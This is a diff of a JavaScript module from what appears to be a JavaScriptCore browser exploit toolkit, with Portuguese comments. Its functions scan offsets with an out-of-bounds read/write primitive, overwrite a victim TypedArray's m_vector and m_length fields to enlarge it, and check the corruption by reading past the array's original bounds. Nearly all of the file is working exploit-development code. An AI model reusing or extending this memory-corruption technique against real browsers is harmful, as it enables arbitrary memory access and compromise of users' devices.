@@ -3,266 +3,247 @@ import { AdvancedInt64 } from './int64.mjs';
 import { log, PAUSE_LAB, toHexS1 } from './utils.mjs';
 import * as Core from './core_exploit.mjs';
 import * as Groomer from './heap_groomer.mjs'; // Para Groomer.victim_object
-import { JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs'; // Importa os offsets ATUALIZADOS e config update
+import { JSC_OFFSETS, updateOOBConfigFromUI, OOB_CONFIG } from './config.mjs';
 
 let _CURRENT_TEST_GAP = 0;
 let _last_successful_gap = null;
 const FNAME_BASE = "VictimCorruptor";
 
+// Callbacks para atualizar a UI
+let _updateCurrentGapUICallback = null;
+let _updateSuccessfulGapUICallback = null;
+
 export function getCurrentTestGap() { return _CURRENT_TEST_GAP; }
-export function setCurrentTestGap(value) { _CURRENT_TEST_GAP = value; }
+export function setCurrentTestGap(value) {
+    _CURRENT_TEST_GAP = value;
+    if (typeof _updateCurrentGapUICallback === 'function') {
+        _updateCurrentGapUICallback(_CURRENT_TEST_GAP);
+    }
+}
 export function getLastSuccessfulGap() { return _last_successful_gap; }
-export function setLastSuccessfulGap(value) { _last_successful_gap = value; }
-export function resetLastSuccessfulGap() { _last_successful_gap = null; }
+export function setLastSuccessfulGap(value) {
+    _last_successful_gap = value;
+    if (typeof _updateSuccessfulGapUICallback === 'function') {
+        _updateSuccessfulGapUICallback(_last_successful_gap);
+    }
+}
+export function resetLastSuccessfulGap() {
+    _last_successful_gap = null;
+    if (typeof _updateSuccessfulGapUICallback === 'function') {
+        _updateSuccessfulGapUICallback(null);
+    }
+}
+
+// Funções para serem chamadas pelo app.mjs para registrar os callbacks
+export function setGapUpdateUICallback(callback) {
+    _updateCurrentGapUICallback = callback;
+}
+export function setSuccessfulGapUpdateUICallback(callback) {
+    _updateSuccessfulGapUICallback = callback;
+}
 
 
 async function checkVictimObjectProperties(expectedLength = null, expectedByteLength = null) {
     const FNAME_CHECK = `${FNAME_BASE}.checkVictim`;
     if (!Groomer.victim_object) {
         log("   checkVictim: Objeto vítima não definido.", "warn", FNAME_CHECK);
-        return { length_ok: false, bytelength_ok: false, vector_ok: false }; // vector_ok não é realmente verificado aqui
-    }
-    // Adapte se usar outros tipos de vítima no futuro. Por agora, focado em TypedArray.
-    if (!(Groomer.victim_object instanceof Uint8Array ||
-          Groomer.victim_object instanceof Uint16Array ||
-          Groomer.victim_object instanceof Uint32Array ||
-          Groomer.victim_object instanceof Float32Array ||
-          Groomer.victim_object instanceof Float64Array)) {
-        log(`   checkVictim: Objeto vítima é do tipo ${Groomer.victim_object.constructor.name}. Verificação de propriedades não totalmente implementada para este tipo exato.`, "warn", FNAME_CHECK);
-        // Permite continuar para TypedArrays genéricos
+        return { length_ok: false, bytelength_ok: false, vector_ok: false };
     }
 
-    let length_ok = true;
-    let bytelength_ok = true;
-
-    if (expectedLength !== null && Groomer.victim_object.length !== expectedLength) {
-        log(`   [CHECK-FAIL] Comprimento da vítima: ${Groomer.victim_object.length}, Esperado: ${expectedLength}`, "error", FNAME_CHECK);
-        length_ok = false;
-    } else if (expectedLength !== null) {
-        log(`   [CHECK-OK] Comprimento da vítima: ${Groomer.victim_object.length}`, "good", FNAME_CHECK);
-    }
-
-    if (expectedByteLength !== null && Groomer.victim_object.byteLength !== expectedByteLength) {
-        log(`   [CHECK-FAIL] ByteLength da vítima: ${Groomer.victim_object.byteLength}, Esperado: ${expectedByteLength}`, "error", FNAME_CHECK);
-        bytelength_ok = false;
-    } else if (expectedByteLength !== null) {
-        log(`   [CHECK-OK] ByteLength da vítima: ${Groomer.victim_object.byteLength}`, "good", FNAME_CHECK);
-    }
-    return { length_ok, bytelength_ok, vector_ok: true /* placeholder */ };
-}
-
-
-export async function try_corrupt_fields_for_gap(gap_to_test_decimal) {
-    const FNAME_TRY_FIELDS = `${FNAME_BASE}.try_corrupt_fields`;
-    const current_gap_to_test = parseInt(gap_to_test_decimal); // Garante que é número
-    log(`--- Tentando corromper campos para GAP: ${current_gap_to_test} (${toHexS1(current_gap_to_test)}) ---`, 'subtest', FNAME_TRY_FIELDS);
-    updateOOBConfigFromUI(); // Garante que as configs OOB estão atualizadas
-
-    if (!Core.oob_array_buffer_real || !Core.oob_dataview_real) {
-        log("   Tentando ativar primitiva OOB...", 'warn', FNAME_TRY_FIELDS);
-        await Core.triggerOOB_primitive();
-        if (!Core.oob_array_buffer_real) {
-            log("   ERRO: Primitiva OOB não está ativa. Abortando.", 'error', FNAME_TRY_FIELDS);
-            return { success: false, error: "OOB_INACTIVE", details: {} };
-        }
-    }
-
-    if (!Groomer.victim_object) {
-        log("   AVISO: Objeto vítima (Groomer.victim_object) não está preparado. A corrupção pode não ser verificável via JS.", 'warn', FNAME_TRY_FIELDS);
-    }
-
-    const original_victim_length = Groomer.victim_object ? Groomer.victim_object.length : -1;
-
-    // O 'current_gap_to_test' é o offset relativo ao início da janela OOB (Core.getInitialBufferSize())
-    // até o início do objeto vítima (JSObject TypedArray).
-    const victim_base_offset_in_oob = current_gap_to_test;
-
-    const m_vector_field_offset_in_oob = victim_base_offset_in_oob + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET;
-    const m_length_field_offset_in_oob = victim_base_offset_in_oob + JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET;
-
-    const new_m_length_val = 0x7F0000; // Um valor grande mas não o máximo absoluto, para tentar OOB access na vítima
-    const new_m_vector_val_low = 0xDEADBEEF;
-    const new_m_vector_val_high = 0xCAFEBABE;
-    const new_m_vector_int64 = new AdvancedInt64(new_m_vector_val_low, new_m_vector_val_high);
-
-    let success_flag = false;
-    let error_type = null;
-    let details = {
-        gap_tested: toHexS1(current_gap_to_test),
-        original_m_vector: "N/A",
-        original_m_length: "N/A",
-        written_m_vector: new_m_vector_int64.toString(true),
-        written_m_length: toHexS1(new_m_length_val)
-    };
+    let actualLength = -1;
+    let actualByteLength = -1;
+    let lengthOk = false;
+    let byteLengthOk = false;
 
     try {
-        log(`   Lendo m_vector original em offset OOB relativo: ${toHexS1(m_vector_field_offset_in_oob)}`, 'info', FNAME_TRY_FIELDS);
-        const original_m_vector = Core.oob_read_relative(m_vector_field_offset_in_oob, 8);
-        details.original_m_vector = original_m_vector ? original_m_vector.toString(true) : "ERRO_LEITURA";
-        log(`     Valor original m_vector (no GAP): ${details.original_m_vector}`, 'leak', FNAME_TRY_FIELDS);
+        actualLength = Groomer.victim_object.length;
+        actualByteLength = Groomer.victim_object.byteLength;
 
-        log(`   Lendo m_length original em offset OOB relativo: ${toHexS1(m_length_field_offset_in_oob)}`, 'info', FNAME_TRY_FIELDS);
-        const original_m_length = Core.oob_read_relative(m_length_field_offset_in_oob, 4);
-        details.original_m_length = original_m_length !== undefined ? toHexS1(original_m_length) : "ERRO_LEITURA";
-        log(`     Valor original m_length (no GAP): ${details.original_m_length}`, 'leak', FNAME_TRY_FIELDS);
+        log(`   checkVictim: Vítima Atual - Length: ${actualLength}, ByteLength: ${actualByteLength}`, "info", FNAME_CHECK);
 
-        log(`   Escrevendo novo m_length (${toHexS1(new_m_length_val)}) em offset OOB: ${toHexS1(m_length_field_offset_in_oob)}`, 'vuln', FNAME_TRY_FIELDS);
-        Core.oob_write_relative(m_length_field_offset_in_oob, new_m_length_val, 4);
-
-        log(`   Escrevendo novo m_vector (${new_m_vector_int64.toString(true)}) em offset OOB: ${toHexS1(m_vector_field_offset_in_oob)}`, 'vuln', FNAME_TRY_FIELDS);
-        Core.oob_write_relative(m_vector_field_offset_in_oob, new_m_vector_int64, 8);
-
-        log("   Corrupção tentada. Verificando o objeto vítima (se existir)...", 'info', FNAME_TRY_FIELDS);
-        await PAUSE_LAB(50);
-
-        if (Groomer.victim_object) {
-            log(`     Comprimento original JS da vítima: ${original_victim_length} (${toHexS1(original_victim_length)})`, "info", FNAME_TRY_FIELDS);
-            log(`     Comprimento ATUAL JS da vítima: ${Groomer.victim_object.length} (${toHexS1(Groomer.victim_object.length)})`, "analysis", FNAME_TRY_FIELDS);
-
-            if (Groomer.victim_object.length === new_m_length_val) {
-                log("     SUCESSO! Comprimento do objeto vítima foi alterado para o valor escrito!", "good", FNAME_TRY_FIELDS);
-                success_flag = true;
-                setLastSuccessfulGap(current_gap_to_test);
-                error_type = "LENGTH_CORRUPTED_SUCCESS";
-            } else {
-                 log("     AVISO: Comprimento do objeto vítima NÃO corresponde ao valor escrito.", "warn", FNAME_TRY_FIELDS);
-                 // Mesmo se não for igual, se for diferente do original, pode ser um sinal.
-                 if (Groomer.victim_object.length !== original_victim_length) {
-                     log("     Porém, o comprimento mudou do original, o que é PROMISSOR!", "vuln", FNAME_TRY_FIELDS);
-                     success_flag = true; // Considerar como um tipo de sucesso
-                     setLastSuccessfulGap(current_gap_to_test);
-                     error_type = "LENGTH_ALTERED_PARTIAL_SUCCESS";
-                 }
-            }
-            try {
-                const high_victim_index = Math.min(new_m_length_val - 1, original_victim_length + 10);
-                log(`     Tentando ler Groomer.victim_object[${toHexS1(high_victim_index)}]...`, "info", FNAME_TRY_FIELDS);
-                const val = Groomer.victim_object[high_victim_index];
-                log(`       Valor lido: ${toHexS1(val)}`, "leak", FNAME_TRY_FIELDS);
-            } catch (e_access) {
-                log(`     EXCEÇÃO ao acessar vítima após corrupção: ${e_access.name} - ${e_access.message}`, "error", FNAME_TRY_FIELDS);
-                log("     Esta exceção PODE indicar sucesso na corrupção (ex: segmentation fault simulado).", "vuln", FNAME_TRY_FIELDS);
-                success_flag = true;
-                setLastSuccessfulGap(current_gap_to_test);
-                error_type = e_access.name || "VICTIM_ACCESS_EXCEPTION";
-            }
+        if (expectedLength !== null) {
+            lengthOk = (actualLength === expectedLength);
+            log(`   checkVictim: Comprimento esperado ${expectedLength}, atual ${actualLength}. OK: ${lengthOk}`, lengthOk ? "good" : "warn", FNAME_CHECK);
         } else {
-            log("   Nenhum objeto vítima para verificar. Sucesso da corrupção não pode ser diretamente confirmado via JS.", "warn", FNAME_TRY_FIELDS);
-            success_flag = true; // Sem vítima, sucesso se não houver erro OOB fatal
-            error_type = "NO_VICTIM_FOR_JS_CHECK";
+            lengthOk = true; // Não checando se não esperado
         }
 
-        // Tentar restaurar os valores originais para permitir mais testes
-        if (details.original_m_length !== "ERRO_LEITURA" && details.original_m_length !== "N/A") {
-            log(`   Restaurando m_length original (${details.original_m_length}) em offset OOB: ${toHexS1(m_length_field_offset_in_oob)}`, 'info', FNAME_TRY_FIELDS);
-            Core.oob_write_relative(m_length_field_offset_in_oob, parseInt(details.original_m_length.substring(2),16), 4);
-        }
-        if (details.original_m_vector !== "ERRO_LEITURA" && details.original_m_vector !== "N/A") {
-            log(`   Restaurando m_vector original (${details.original_m_vector}) em offset OOB: ${toHexS1(m_vector_field_offset_in_oob)}`, 'info', FNAME_TRY_FIELDS);
-            Core.oob_write_relative(m_vector_field_offset_in_oob, new AdvancedInt64(details.original_m_vector), 8);
+        if (expectedByteLength !== null) {
+            byteLengthOk = (actualByteLength === expectedByteLength);
+            log(`   checkVictim: ByteLength esperado ${expectedByteLength}, atual ${actualByteLength}. OK: ${byteLengthOk}`, byteLengthOk ? "good" : "warn", FNAME_CHECK);
+        } else {
+            byteLengthOk = true; // Não checando se não esperado
         }
 
-    } catch (e_oob) {
-        log(`   ERRO FATAL durante operações OOB para GAP ${current_gap_to_test}: ${e_oob.name} - ${e_oob.message}`, 'error', FNAME_TRY_FIELDS);
-        // Um erro de OOB (especialmente RangeError ao tentar ler/escrever fora do buffer real)
-        // também pode indicar que o GAP calculado para os campos da vítima estava fora dos limites acessíveis.
-        success_flag = false; // Se a própria operação OOB falhou catastroficamente, não é um "sucesso" de corrupção.
-        error_type = e_oob.name || "OOB_OPERATION_EXCEPTION";
-        // Não setar lastSuccessfulGap aqui, pois a operação OOB em si falhou.
-         if (e_oob instanceof RangeError && e_oob.message.toLowerCase().includes("fora dos limites do buffer real")) {
-             log(`     Este GAP (${toHexS1(current_gap_to_test)}) para os campos da vítima parece estar fora dos limites do buffer OOB principal.`, 'warn', FNAME_TRY_FIELDS);
-             return { success: false, error: "FIELD_TARGETING_OUT_OF_BOUNDS", details };
-        }
+    } catch (e) {
+        log(`   checkVictim: Erro ao acessar propriedades da vítima: ${e.message}`, "error", FNAME_CHECK);
     }
-    const logType = success_flag ? (error_type === "LENGTH_CORRUPTED_SUCCESS" ? 'good' : 'vuln') : 'warn';
-    log(`--- Tentativa de corrupção para GAP ${current_gap_to_test} concluída. Status: ${success_flag ? 'SUCESSO/PROMISSOR' : 'FALHA/INCERTO'}, Tipo: ${error_type} ---`, logType, FNAME_TRY_FIELDS);
-    return { success: success_flag, error: error_type, details };
+    return { length_ok: lengthOk, bytelength_ok: byteLengthOk, vector_ok: true /* placeholder */ };
 }
 
-export async function findAndCorruptVictimFields_Iterative(gapStartStr, gapEndStr, gapStepStr, victimSizeStr) {
+
+export async function try_corrupt_fields_for_gap(gapOrRelativeOffset,
+                                                 targetLength = 0x007F0000, /* ~8M elementos, um valor grande e incomum */
+                                                 targetVectorPtr = new AdvancedInt64("0xcafebabe_deadbeef")) {
+    const FNAME_TRY_CORRUPT = `${FNAME_BASE}.try_corrupt_fields`;
+    log(`--- Tentando Corromper Campos para GAP/Offset: ${toHexS1(gapOrRelativeOffset)} (${gapOrRelativeOffset}) ---`, "test", FNAME_TRY_CORRUPT);
+
+    if (!Core.oob_dataview_real) {
+        log("ERRO CRÍTICO: Primitiva OOB não está configurada (Passo 0). Corrupção abortada.", "error", FNAME_TRY_CORRUPT);
+        return false;
+    }
+    if (!Groomer.victim_object) {
+        log("ERRO CRÍTICO: Objeto vítima (Groomer.victim_object) não preparado (Passo 1a). Corrupção abortada.", "error", FNAME_TRY_CORRUPT);
+        return false;
+    }
+
+    const originalVictimLength = Groomer.victim_object.length;
+    const originalVictimByteLength = Groomer.victim_object.byteLength;
+    log(`   Estado Original da Vítima: Length=${originalVictimLength}, ByteLength=${originalVictimByteLength}`, "info", FNAME_TRY_CORRUPT);
+
+    let success = false;
+    let original_m_vector_val = AdvancedInt64.Zero;
+    let original_m_length_val = 0;
+
+    try {
+        // 1. Ler valores originais dos campos m_vector e m_length do objeto TypedArray na memória OOB
+        log("   Lendo valores originais dos campos da vítima via OOB...", "info", FNAME_TRY_CORRUPT);
+        original_m_vector_val = Core.oob_read_relative(gapOrRelativeOffset + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET, 8);
+        original_m_length_val = Core.oob_read_relative(gapOrRelativeOffset + JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET, 4); // length é 32-bit
+
+        if (!isFinite(original_m_length_val) || !(original_m_vector_val instanceof AdvancedInt64)) {
+             log(`   ERRO: Falha ao ler valores originais dos campos da vítima. m_vector: ${original_m_vector_val}, m_length: ${original_m_length_val}`, "error", FNAME_TRY_CORRUPT);
+             return false;
+        }
+        log(`   Valores Originais (lidos via OOB no GAP ${toHexS1(gapOrRelativeOffset)}):`, "info", FNAME_TRY_CORRUPT);
+        log(`     m_vector: ${original_m_vector_val.toString(true)}`, "ptr", FNAME_TRY_CORRUPT);
+        log(`     m_length: ${toHexS1(original_m_length_val)} (${original_m_length_val})`, "info", FNAME_TRY_CORRUPT);
+
+        // 2. Escrever novos valores para m_vector e m_length
+        log(`   Escrevendo novos valores... m_vector=${targetVectorPtr.toString(true)}, m_length=${toHexS1(targetLength)}`, "info", FNAME_TRY_CORRUPT);
+        Core.oob_write_relative(gapOrRelativeOffset + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET, targetVectorPtr, 8);
+        Core.oob_write_relative(gapOrRelativeOffset + JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET, targetLength, 4);
+        log("   Escrita OOB para campos da vítima concluída.", "good", FNAME_TRY_CORRUPT);
+
+        // 3. Verificar se as propriedades do objeto Groomer.victim_object refletem a corrupção
+        //    A mudança de m_length deve ser refletida diretamente. m_vector é mais difícil de verificar sem RCE.
+        await PAUSE_LAB(50); // Pequena pausa para garantir que as mudanças se propaguem, se necessário.
+
+        const currentVictimLength = Groomer.victim_object.length;
+        log(`   Comprimento ATUAL do objeto vítima (após corrupção OOB): ${currentVictimLength}`, "info", FNAME_TRY_CORRUPT);
+
+        if (currentVictimLength === targetLength) {
+            log("   SUCESSO! Comprimento do objeto vítima corresponde ao valor escrito!", "vuln", FNAME_TRY_CORRUPT);
+            success = true;
+            setLastSuccessfulGap(gapOrRelativeOffset);
+        } else {
+            log(`   AVISO: Comprimento do objeto vítima (${currentVictimLength}) NÃO corresponde ao valor escrito (${targetLength}).`, "warn", FNAME_TRY_CORRUPT);
+        }
+
+        // Teste adicional: Tentar acessar um índice que estaria OOB para o length original, mas in-bounds para o novo
+        if (success && targetLength > originalVictimLength && originalVictimLength > 0) {
+            try {
+                const testIndex = originalVictimLength + Math.min(10, Math.floor((targetLength - originalVictimLength)/2) ); // Um índice dentro dos novos limites
+                log(`   Testando acesso em índice ${testIndex} (originalmente OOB, agora dentro dos limites)...`, "info", FNAME_TRY_CORRUPT);
+                const val = Groomer.victim_object[testIndex];
+                log(`   Valor lido em Groomer.victim_object[${testIndex}]: ${toHexS1(val)}`, "info", FNAME_TRY_CORRUPT);
+                // Se não crashar, é um bom sinal. O valor pode ser lixo se m_vector foi alterado para um local inválido.
+            } catch (e) {
+                log(`   ERRO ao tentar acessar índice ${testIndex} após corrupção de length: ${e.message}`, "error", FNAME_TRY_CORRUPT);
+                // Isso pode indicar que, embora length tenha mudado, m_vector não é válido ou o ArrayBuffer subjacente não foi expandido.
+            }
+        }
+
+
+    } catch (e) {
+        log(`ERRO CRÍTICO durante tentativa de corrupção: ${e.message}`, "error", FNAME_TRY_CORRUPT);
+        console.error(e);
+        success = false;
+    } finally {
+        // 4. Restaurar valores originais para permitir testes subsequentes (se a leitura foi bem-sucedida)
+        if (isFinite(original_m_length_val) && original_m_vector_val instanceof AdvancedInt64 && !original_m_vector_val.isNullPtr()) {
+            log("   Restaurando valores originais dos campos da vítima via OOB...", "info", FNAME_TRY_CORRUPT);
+            Core.oob_write_relative(gapOrRelativeOffset + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET, original_m_vector_val, 8);
+            Core.oob_write_relative(gapOrRelativeOffset + JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET, original_m_length_val, 4);
+            log("   Restauração concluída.", "good", FNAME_TRY_CORRUPT);
+
+            // Verificação rápida se a restauração do length funcionou
+            await PAUSE_LAB(50);
+            if (Groomer.victim_object && Groomer.victim_object.length !== originalVictimLength) {
+                log(`   AVISO PÓS-RESTAURAÇÃO: Length da vítima (${Groomer.victim_object.length}) não é igual ao original (${originalVictimLength}).`, "warn", FNAME_TRY_CORRUPT);
+            } else if (Groomer.victim_object) {
+                 log(`   PÓS-RESTAURAÇÃO: Length da vítima (${Groomer.victim_object.length}) corresponde ao original.`, "good", FNAME_TRY_CORRUPT);
+            }
+
+        } else {
+            log("   AVISO: Não foi possível restaurar valores originais (leitura inicial falhou ou ponteiro nulo).", "warn", FNAME_TRY_CORRUPT);
+        }
+    }
+    log(`--- Tentativa de Corrupção para GAP ${toHexS1(gapOrRelativeOffset)} Concluída. Sucesso: ${success} ---`, success ? "good" : "warn", FNAME_TRY_CORRUPT);
+    return success;
+}
+
+
+export async function findAndCorruptVictimFields_Iterative() {
     const FNAME = `${FNAME_BASE}.findAndCorruptIterative`;
-    log(`--- Iniciando Busca Iterativa de GAP & Corrupção ---`, "test", FNAME);
+    log(`--- ${FNAME} ---`, 'test', FNAME);
+    updateOOBConfigFromUI(); // Garante que OOB_CONFIG está atualizado
 
-    const gapStart = parseInt(gapStartStr);
-    const gapEnd = parseInt(gapEndStr);
-    const gapStep = parseInt(gapStepStr);
-    const victimSize = parseInt(victimSizeStr);
+    const startGapEl = document.getElementById('victimCorruptStartGap');
+    const endGapEl = document.getElementById('victimCorruptEndGap');
+    const stepGapEl = document.getElementById('victimCorruptStepGap');
+    const victimSizeEl = document.getElementById('victimObjectSize'); // Usado para log
 
-    if (isNaN(gapStart) || isNaN(gapEnd) || isNaN(gapStep) || gapStep <= 0) {
-        log("ERRO: Parâmetros de GAP inválidos para busca iterativa.", "error", FNAME);
-        return;
-    }
-     if (isNaN(victimSize)) {
-        log("ERRO: Tamanho da vítima inválido.", "error", FNAME);
-        // return; // Pode continuar sem vítima para testes de crash apenas com GAPs
-    }
+    let startGap = startGapEl ? parseInt(startGapEl.value, 10) : 0;
+    let endGap = endGapEl ? parseInt(endGapEl.value, 10) : 256;
+    let stepGap = stepGapEl ? parseInt(stepGapEl.value, 10) : 8;
+    const victimSize = victimSizeEl ? parseInt(victimSizeEl.value, 10) : OOB_CONFIG.ALLOCATION_SIZE;
 
+    if (isNaN(startGap)) startGap = 0;
+    if (isNaN(endGap) || endGap <= startGap) endGap = startGap + 256;
+    if (isNaN(stepGap) || stepGap <= 0) stepGap = 8;
 
-    log(`   Range de GAP: ${gapStart} (${toHexS1(gapStart)}) a ${gapEnd} (${toHexS1(gapEnd)}), Passo: ${gapStep}`, "info", FNAME);
-    if (!isNaN(victimSize) && victimSize > 0) log(`   Tamanho da Vítima para Grooming: ${victimSize}`, "info", FNAME);
-    else log("   AVISO: Tamanho da vítima não especificado ou inválido. Grooming/verificação da vítima JS não será feito.", "warn", FNAME);
+    log(`Iniciando busca iterativa de GAP para corrupção: de ${startGap} a ${endGap}, passo ${stepGap}. Tamanho da vítima (para grooming): ${victimSize}`, "info", FNAME);
 
-
-    resetLastSuccessfulGap();
-    updateOOBConfigFromUI(); // Garante configs OOB
-
-    if (!Core.oob_array_buffer_real && gapEnd >= 0) {
-        log("   AVISO: Primitiva OOB não parece estar ativa. Ativando...", "warn", FNAME);
-        await Core.triggerOOB_primitive();
-        if (!Core.oob_array_buffer_real) {
-            log("   ERRO: Falha ao ativar primitiva OOB. Abortando busca.", "error", FNAME);
+    if (!Groomer.victim_object) {
+        log("   Preparando objeto vítima (default) antes da busca iterativa...", "info", FNAME);
+        await Groomer.prepareVictim(victimSize.toString());
+        if (!Groomer.victim_object) {
+            log("   ERRO CRÍTICO: Falha ao preparar objeto vítima. Abortando busca iterativa.", "error", FNAME);
             return;
         }
     }
-    
-    if (!Groomer.victim_object && !isNaN(victimSize) && victimSize > 0) {
-        log("   Preparando objeto vítima para a busca...", "info", FNAME);
-        await Groomer.prepareVictim(victimSize); // Groomer.prepareVictim deve retornar true/false
-        if (!Groomer.victim_object) {
-            log("   AVISO: Falha ao preparar objeto vítima. A verificação da corrupção via JS será limitada.", "warn", FNAME);
+
+    let foundWorkingGap = false;
+    resetLastSuccessfulGap(); // Reseta antes de iniciar a busca
+
+    const btn = document.getElementById('btnFindAndCorruptIterative');
+    if(btn) btn.disabled = true;
+
+    for (let currentGap = startGap; currentGap <= endGap; currentGap += stepGap) {
+        setCurrentTestGap(currentGap); // Atualiza UI
+        log(`Testando GAP: ${toHexS1(currentGap)} (${currentGap})`, "subtest", FNAME);
+        const success = await try_corrupt_fields_for_gap(currentGap);
+        if (success) {
+            log(`SUCESSO SIGNIFICATIVO: GAP ${toHexS1(currentGap)} permitiu corrupção verificável de m_length!`, "vuln", FNAME);
+            foundWorkingGap = true;
+            // Não paramos no primeiro sucesso para permitir que o usuário veja outros possíveis GAPs
+            // setLastSuccessfulGap já foi chamado dentro de try_corrupt_fields_for_gap
+        }
+        await PAUSE_LAB(100); // Pausa entre tentativas
+        if (document.hidden) {
+             log("Busca iterativa de GAP interrompida pois a página ficou oculta.", "warn", FNAME);
+             break;
         }
     }
+    if(btn) btn.disabled = false;
 
-    for (let current_gap = gapStart; current_gap <= gapEnd; current_gap += gapStep) {
-        setCurrentTestGap(current_gap);
-        log(`Testando GAP atual: ${current_gap} (${toHexS1(current_gap)})`, "info", `${FNAME}.Loop`);
-        
-        const currentGapUIEl = document.getElementById('current_gap_display');
-        if (currentGapUIEl) currentGapUIEl.textContent = `${current_gap} / ${toHexS1(current_gap)}`;
-
-        const result = await try_corrupt_fields_for_gap(current_gap);
-
-        if (result.success) {
-            log(`   GAP PROMISSOR ENCONTRADO: ${current_gap} (${toHexS1(current_gap)})! Tipo de Sucesso/Erro: ${result.error}`, "vuln", FNAME);
-            log(`     Detalhes: m_vec_orig: ${result.details?.original_m_vector}, m_len_orig: ${result.details?.original_m_length}`, "leak", FNAME);
-            log("   Parando busca no primeiro GAP promissor.", "info", FNAME);
-            break; 
-        }
-
-        await PAUSE_LAB(100);
-        if (document.hidden) { log("Busca abortada, página não visível.", "warn", FNAME); break; }
-        
-        if (current_gap < gapEnd && (current_gap + gapStep) > gapEnd && current_gap !== gapEnd ) {
-             // Ajusta para garantir que o último valor (gapEnd) seja testado se o passo não o cobrir exatamente.
-            if ( (gapEnd - current_gap) < gapStep && (gapEnd - current_gap) > 0) {
-                // Se o próximo passo ultrapassa, mas ainda não atingiu o fim,
-                // testa o gapEnd na próxima iteração se não for o current_gap.
-                // Este bloco pode precisar de ajuste fino dependendo do comportamento desejado.
-                // A maneira mais simples é deixar o loop ir e ele não fará a iteração > gapEnd.
-                // Se for importante testar *exatamente* gapEnd, o loop deve ser `current_gap <= gapEnd`.
-            }
-        }
-    }
-
-    if (getLastSuccessfulGap() !== null) {
-        log(`Busca iterativa concluída. GAP DE SUCESSO IDENTIFICADO: ${getLastSuccessfulGap()} (${toHexS1(getLastSuccessfulGap())})`, "good", FNAME);
-        log("   Este GAP provavelmente permitiu corromper campos da vítima ou atingiu memória sensível.", "vuln", FNAME);
+    if (foundWorkingGap) {
+        log(`Busca iterativa concluída. Pelo menos um GAP funcional foi encontrado (último sucesso: ${toHexS1(getLastSuccessfulGap())}).`, "good", FNAME);
     } else {
-         log("Busca iterativa concluída. Nenhum GAP causou um crash/exceção óbvia ou mudança de length verificável que tenha sido classificada como 'sucesso'.", "warn", FNAME);
+        log("Busca iterativa concluída. Nenhum GAP causou um crash/exceção óbvia ou mudança de length verificável que tenha sido classificada como 'sucesso'.", "warn", FNAME);
     }
-    setCurrentTestGap(0);
-    const currentGapUIEl = document.getElementById('current_gap_display');
-    if (currentGapUIEl) currentGapUIEl.textContent = "-";
+    setCurrentTestGap(0); // Reseta display da UI
 }
 
 export async function testCorruptKnownGapButtonHandler() {
@@ -284,15 +265,32 @@ export async function testCorruptKnownGapButtonHandler() {
     } else {
         gapToTest = getLastSuccessfulGap();
     }
-    
+
     if (gapToTest === null || isNaN(gapToTest)) {
         log("Nenhum GAP válido (último sucesso ou input) para testar. Forneça um GAP no campo 'GAP para Teste Direto'.", "error", FNAME_TCKG_BTN);
         return;
     }
-    // Atualiza o input para refletir o valor que será usado, em decimal
-    if (gapInputEl) gapInputEl.value = gapToTest;
+
+    // Atualiza o input para refletir o valor que será usado, se veio do 'lastSuccessfulGap'
+    if (gapInputEl && (gapInputEl.value.trim() === "" || isNaN(parseInt(gapInputEl.value.trim().toLowerCase().startsWith("0x") ? gapInputEl.value.trim() : gapInputEl.value.trim(), gapInputEl.value.trim().toLowerCase().startsWith("0x") ? 16 : 10)) ) ) {
+        gapInputEl.value = gapToTest.toString(); // Atualiza com o valor numérico
+    }
 
 
-    log(`Testando corrupção no GAP: ${gapToTest} (${toHexS1(gapToTest)})`, "test", FNAME_TCKG_BTN);
-    await try_corrupt_fields_for_gap(gapToTest);
+    log(`--- ${FNAME_TCKG_BTN}: Testando GAP ${toHexS1(gapToTest)} (${gapToTest}) ---`, 'test', FNAME_TCKG_BTN);
+    setCurrentTestGap(gapToTest); // Atualiza UI
+
+    const btn = document.getElementById('btnTestCorruptKnownGap');
+    if(btn) btn.disabled = true;
+
+    const success = await try_corrupt_fields_for_gap(gapToTest);
+
+    if(btn) btn.disabled = false;
+    setCurrentTestGap(0); // Reseta display da UI
+
+    if (success) {
+        log(`Corrupção em GAP conhecido ${toHexS1(gapToTest)} foi BEM-SUCEDIDA (m_length alterado).`, "vuln", FNAME_TCKG_BTN);
+    } else {
+        log(`Corrupção em GAP conhecido ${toHexS1(gapToTest)} FALHOU ou não foi verificável.`, "warn", FNAME_TCKG_BTN);
+    }
 }
